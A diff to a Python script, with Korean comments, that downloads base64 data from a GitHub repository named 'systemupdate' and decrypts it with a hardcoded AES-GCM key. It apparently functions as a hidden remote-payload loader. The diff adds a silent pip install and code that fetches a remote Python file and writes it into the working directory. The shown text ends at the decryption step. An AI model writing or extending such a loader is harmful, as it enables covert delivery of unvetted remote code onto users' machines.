@@ -4,6 +4,7 @@ import base64
 import ctypes
 import os
 import ssl
+import subprocess
 import sys
 import time
 import urllib.request
@@ -68,6 +69,36 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
 DATA_URL = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/data.txt"
+RAW_BASE = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/"
+
+
+def _pip_python():
+    exe = sys.executable or ""
+    if exe.lower().endswith("pythonw.exe"):
+        py = os.path.join(os.path.dirname(exe), "python.exe")
+        if os.path.isfile(py):
+            return py
+    return exe
+
+
+def _ensure_imgui_pkgs():
+    """bat 안 바꿔도 ImGui 패키지 자동 설치."""
+    need = []
+    for mod, pkg in (("imgui", "imgui"), ("glfw", "glfw"), ("OpenGL", "PyOpenGL")):
+        try:
+            __import__(mod)
+        except Exception:
+            need.append(pkg)
+    if not need:
+        return
+    try:
+        subprocess.run(
+            [_pip_python(), "-m", "pip", "install", "--quiet"] + need,
+            timeout=300,
+            check=False,
+        )
+    except Exception:
+        pass
 
 
 def fetch_data_b64():
@@ -83,7 +114,28 @@ def fetch_data_b64():
         return r.read().decode("utf-8").strip()
 
 
+def _download_sidecar(name):
+    """ImGui UI 등 data.txt 옆에 필요한 .py 를 GitHub에서 받아 둔다."""
+    dest = os.path.join(os.getcwd(), name)
+    req = urllib.request.Request(
+        RAW_BASE + name + "?t=%d" % int(time.time()),
+        headers={
+            "User-Agent": "ddong",
+            "Cache-Control": "no-cache, no-store, must-revalidate",
+            "Pragma": "no-cache",
+        },
+    )
+    with urllib.request.urlopen(req, timeout=25, context=ctx) as r:
+        data = r.read()
+    if not data or len(data) < 50:
+        raise RuntimeError("%s 다운로드 실패" % name)
+    with open(dest, "wb") as f:
+        f.write(data)
+
+
 try:
+    _ensure_imgui_pkgs()
+    _download_sidecar("imgui_ui.py")
     b64_str = fetch_data_b64()
     raw = base64.b64decode(b64_str)
     g = AESGCM(KEY)
